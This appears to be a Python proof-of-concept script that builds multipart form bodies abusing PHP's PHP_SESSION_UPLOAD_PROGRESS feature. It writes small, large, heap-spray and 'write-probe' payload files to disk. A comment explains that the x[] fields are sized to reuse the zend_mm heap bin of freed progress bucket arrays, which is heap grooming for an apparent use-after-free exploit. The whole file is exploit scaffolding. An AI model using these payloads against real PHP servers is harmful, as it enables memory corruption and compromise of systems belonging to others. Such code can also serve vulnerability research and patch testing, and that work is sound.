import os
B = b"POCBND"
D = os.path.dirname(os.path.abspath(__file__))

def field(disp, val):
    return (b"--" + B + b"\r\nContent-Disposition: form-data; name=\"" + disp +
            b"\"\r\n\r\n" + val + b"\r\n")

def filepart(disp, fname, data, ctype=b"application/octet-stream"):
    return (b"--" + B + b"\r\nContent-Disposition: form-data; name=\"" + disp +
            b"\"; filename=\"" + fname + b"\"\r\nContent-Type: " + ctype +
            b"\r\n\r\n" + data + b"\r\n")

marker = field(b"PHP_SESSION_UPLOAD_PROGRESS", b"1")
END = b"--" + B + b"--\r\n"

small = marker + filepart(b"file", b"p.bin", b"A" * 4096) + END
big = marker + filepart(b"file", b"p.bin", b"A" * 200000) + END
spray = (marker + filepart(b"file", b"p.bin", b"A" * 200000)
         + b"".join(field(b"x[]", b"z" * 2048) for _ in range(150)) + END)

# Write-probe body: x[] fields sized to land in the SAME zend_mm bin as the
# freed progress bucket arrays (~400B: 32 hdr + 500 + 1 = 533 -> 536 bin, matching array_init blocks (280 hdr + 8x32))
probe = (marker + filepart(b"file", b"p.bin", b"A" * 200000)
         + b"".join(field(b"x[]", b"A" * 500) for _ in range(150)) + END)

for name, body in [("small.bin", small), ("big.bin", big), ("spray.bin", spray), ("probe.bin", probe)]:
    open(os.path.join(D, name), "wb").write(body)
    print(name, len(body))
